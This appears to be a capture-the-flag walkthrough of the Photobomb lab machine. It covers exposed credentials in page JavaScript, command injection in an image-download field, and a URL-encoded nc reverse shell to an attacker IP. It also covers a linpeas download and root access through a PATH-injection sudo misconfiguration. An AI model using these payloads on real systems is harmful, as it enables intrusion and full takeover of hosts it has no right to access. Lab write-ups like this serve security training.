# Photobomb (Easy)

<figure><img src="../../../.gitbook/assets/Photobomb.png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
```

Notes:

Port 80 is open, this will most likely be the entry point for this machine.&#x20;

* <mark style="color:yellow;">"Credentials are in your welcome pack"? -- View visual inspection</mark>
* Added photobomb.htb to /etc/hosts

Port 22 is open, can we steal SSH keys or produce them to establish a better shell?

## Enumeration

### Port 80 - HTTP (nginx 1.18.0)

#### Visual Inspection:

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

* Check page source
* Credentials are stored here, but we are presented with a login field

#### Page Source:

photobomb.js

{% code overflow="wrap" %}
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
{% endcode %}

* We are given credentials here!

Navigate to the following in the URL bar:

```
http://pH0t0:b0Mb!@photobomb.htb/printer
```

* It will ask if you want to authenticate with these credentials, select yes
* We now have access to /printer

#### Dirsearch:&#x20;

```
dirsearch -u photobomb.htb
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

#### /printer:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* We are met with a page that allows you to download images with different file types and dimensions
* Let's download an image and capture the request in burp

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Let's see if we can exploit the fields in this request and get some strange behavior.

Attempt LFI vulnerability:

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* However, we get a response that says invalid photo
* This makes me know that there are some kind of validation checking techniques in play here
* How can we get around this?

#### Command Injection:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

The semicolon allows us to pass through additional commands. When I was able to check how long it takes for the request to be processed by the server with the sleep command.&#x20;

With semicolon: 3.3 milliseconds

<mark style="color:yellow;">With semicolon and</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`sleep 5`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">command (Be sure to URL encode this as seen in the screenshot): 8.4 seconds</mark>&#x20;

* This confirms that we have successful command injection on our target
* Time for exploitation
* <mark style="color:yellow;">Through some testing, I was able to conclude that the vulnerable field is the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`filetype`</mark><mark style="color:yellow;">field</mark>

## Exploitation

### Command Injection

The injection point is found in <mark style="color:yellow;">http://photobomb.htb/printer</mark> upon downloading an image and adding a semicolon within one of the fields. Immediately after the semicolon, place your URL-Encoded reverse shell here.&#x20;

{% embed url="https://www.revshells.com/" %}

Let's utilize a reverse nc mkfifo reverse shell and make sure that it is URL-Encoded.

Create Reverse Shell:

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.38%201337%20%3E%2Ftmp%2Ff
```

Establish NC Listener:

```
nc -lnvp 1337
```

Append reverse shell to POST request and send to the server:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

* Be sure to upgrade your dummy shell to a fully-interactive one

{% content-ref url="../../../fully-interactive-shell-upgrade.md" %}
[fully-interactive-shell-upgrade.md](../../../fully-interactive-shell-upgrade.md)
{% endcontent-ref %}

## Privilege Escalation

After some manual enumeration, I was unable to find anything. Let's load up linpeas and see if we can find anything.

#### File Transfer

Linpeas Link: [https://github.com/carlospolop/PEASS-ng/releases/download/20230418-edede4b8/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/download/20230418-edede4b8/linpeas.sh)

On attacker machine, run:&#x20;

```
python3 -m http.server 80
```

In reverse shell, run:

```
wget http://10.10.14.38:80/linpeas.sh
```

### Local enumeration

Linpeas output:

```
Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 40960 Mar 17  2022 /var/backups/alternatives.tar.0

Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001

Backup files (limited 100)
/home/wizard/photobomb/log/photobomb.log.old

Unexpected in /opt (usually empty)
cleanup.sh ****

Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Sep 16  2022 /etc/ldap

Analyzing Htpasswd Files (limit 70)
-rw-rw-r-- 1 wizard wizard 44 Sep 14  2022 /home/wizard/photobomb/.htpasswd
pH0t0:$apr1$dnyF00ZD$9PifZwUxL/J0BCS/wTShU1

curl this http://127.0.0.1:4567

/opt/cleanup.sh runs every 5 mins ****
```

Viewing sudo permissions with `sudo -l`:

```
sudo -l

Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

* <mark style="color:yellow;">This is an obvious sign to path injection</mark>
* <mark style="color:yellow;">env\_reset and /opt/cleanup.sh is a binary that can run with sudo (root) permissions with NOPASSWD</mark>

### PrivEsc vector

#### Path Injection

View permissions:

```
sudo -l
```

Navigate to globally writeable directory:

```
cd /dev/shm
```

Create malicious file:

malicious:

```
#!/bin/bash

bash
```

Export Path Variable:

```
export PATH=/dev/shm:$PATH
```

chmod malicous to add executable bit:

```
chmod +x malicious
```

Use vulnerable sudo permissions to obtain new bash shell with sudo permissions granting root:

```
sudo PATH=/dev/shm:$PATH /opt/cleanup.sh
```
